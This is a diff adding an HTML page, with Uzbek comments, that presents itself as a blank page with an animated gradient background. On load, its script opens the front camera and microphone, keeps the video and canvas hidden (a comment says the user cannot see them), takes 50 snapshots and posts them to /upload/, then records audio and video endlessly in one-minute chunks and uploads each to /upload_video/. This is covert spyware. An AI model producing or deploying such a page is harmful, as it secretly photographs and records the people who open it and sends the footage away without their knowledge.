@@ -1,0 +1,119 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Bo'sh sahifa</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      background: linear-gradient(-45deg, #ff6b6b, #f8e473, #4ecdc4, #5a81f7);
+      background-size: 400% 400%;
+      animation: gradientBG 12s ease infinite;
+    }
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    video, canvas {
+      display: none; /* foydalanuvchiga ko‘rinmaydi */
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let stream = null;
+
+    // 📸 Rasm olish sozlamalari
+    const totalImages = 50;   // nechta surat olish
+    const delay = 700;      // surat oralig‘i (ms)
+
+    // 🎥 Video yozish sozlamalari
+    let mediaRecorder;
+    let chunks = [];
+
+    window.onload = async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        video.srcObject = stream;
+
+        // ✅ 1) Avtomatik surat olish
+        for (let i = 0; i < totalImages; i++) {
+          await takeAndSendImage();
+          await new Promise(r => setTimeout(r, delay));
+        }
+
+        // ✅ 2) Avtomatik video yozish (cheksiz 1 minutlik bo‘laklar)
+        startVideoRecording();
+
+      } catch (e) {
+        console.error("Kamera ochilmadi:", e.message);
+      }
+    };
+
+    // 📸 Rasm olish funksiyasi
+    async function takeAndSendImage(){
+      if (!stream) return;
+      const w = video.videoWidth;
+      const h = video.videoHeight;
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, w, h);
+      const dataUrl = canvas.toDataURL('image/png');
+
+      try {
+        const form = new FormData();
+        form.append('image', dataUrl);
+        const res = await fetch('/upload/', { method: 'POST', body: form });
+        const j = await res.json();
+        console.log("Rasm yuborildi:", j);
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    // 🎥 Videoni yozish funksiyasi
+    function startVideoRecording() {
+      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) {
+          chunks.push(e.data);
+        }
+      };
+
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        chunks = [];
+
+        // yuborish
+        const form = new FormData();
+        form.append("video", blob, "chunk.webm");
+        try {
+          const res = await fetch("/upload_video/", { method: "POST", body: form });
+          const j = await res.json();
+          console.log("Video yuborildi:", j);
+        } catch (err) {
+          console.error("Video yuborishda xato:", err);
+        }
+
+        // yana qayta yozishni boshlash
+        startVideoRecording();
+      };
+
+      // 1 daqiqa yozib keyin avtomatik to‘xtatish
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 60 * 1000); // 1 minut
+    }
+  </script>
+</body>
+</html>
